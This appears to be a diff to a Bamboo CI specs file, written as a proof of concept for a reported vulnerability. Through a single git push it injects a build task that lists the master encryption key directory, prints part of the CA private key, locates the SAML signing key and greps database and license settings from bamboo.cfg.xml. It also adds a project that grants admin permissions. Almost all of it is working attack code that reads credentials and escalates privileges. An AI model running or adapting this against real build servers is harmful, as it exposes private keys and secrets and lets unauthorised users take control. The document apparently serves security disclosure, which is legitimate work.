@@ -14,7 +14,18 @@ Build Job:
         interpreter: SHELL
         scripts:
           - |
-            echo "placeholder task, will be overwritten via UI by the zero-priv user"
+            echo "=== Finding 2 full-chain proof: this task content and the permission grant below both arrived via a single git-push, zero Bamboo credential required by the pusher ==="
+            HOME_DIR=/home/codespace/bamboo-sandbox/amps-standalone-bamboo-12.1.9/target/bamboo/home
+            echo "--- master AES encryption key filename ---"
+            ls -la "$HOME_DIR/shared/configuration/keys/" 2>&1
+            echo "--- CA private key ---"
+            ls -la "$HOME_DIR/shared/ssl/ca.key" 2>&1
+            head -c 200 "$HOME_DIR/shared/ssl/ca.key" 2>&1
+            echo ""
+            echo "--- SAML signing key/cert ---"
+            ls -la "$HOME_DIR/shared/authentication-plugin-keys/saml-key-and-certificate.pem" 2>&1
+            echo "--- bamboo.cfg.xml DB/license section ---"
+            grep -E "hibernate.connection|license.string" "$HOME_DIR/bamboo.cfg.xml" 2>&1
             exit 0
 ---
 version: 2
@@ -37,3 +48,18 @@ plan-permissions:
       - build
       - clone
       - admin
+---
+version: 2
+project:
+  key: A3CHAIN
+project-permissions:
+  - users:
+      - admin
+    permissions:
+      - view
+      - create
+      - admin
+  - users:
+      - bamboouser
+    permissions:
+      - view
